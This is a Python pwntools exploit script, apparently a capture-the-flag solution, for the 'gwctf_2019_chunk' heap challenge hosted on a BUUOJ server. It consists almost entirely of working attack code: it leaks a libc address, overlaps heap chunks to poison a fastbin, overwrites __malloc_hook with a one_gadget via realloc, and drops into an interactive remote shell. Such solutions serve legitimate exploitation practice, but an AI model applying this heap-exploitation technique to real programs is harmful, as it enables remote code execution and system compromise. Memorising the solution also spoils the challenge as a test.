# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './gwctf_2019_chunk'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25368'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add(idx , size):
    cmd(1)
    sla('ID:' , idx)
    sla('long' , size)

def show(idx):
    cmd(2)
    sla('show?' , idx)

def delete(idx):
    cmd(3)
    sla('throw?' , idx)

def edit(idx,content):
    cmd(4)
    sla('write?' , idx)
    sa('Content:' , content)

one_gad = one_gadget(libc.path)

def attack():
    add( 2 , 0xf8)
    add( 3 , 0x68)
    add( 0 , 0xf8)
    add( 1 , 0x18)

    delete(0)
    add(0 , 0xf8)
    show(0)

    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    ogg = one_gad[3] + libc.address

    delete(2)
    edit( 3 , '\x00'*0x60 + p64(0x100 + 0x70) )
    delete(0)

    delete(3)

    add( 4 , 0x48)
    add( 5 , 0xf8)

    edit( 5 , flat('\x00'*0xa8 , 0x71 , __malloc_hook - 0x23) + '\n')
    add( 6 , 0x68)
    add( 7 , 0x68)
    edit( 7 , 'a'*(0x13 - 8) + flat( ogg , realloc) + '\n')

    # dbg('malloc')
    add( 8 , 0x20)
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   gwctf_2019_chunk.py
@Time    :   2022/01/30 20:21:41
@Author  :   Niyah 
'''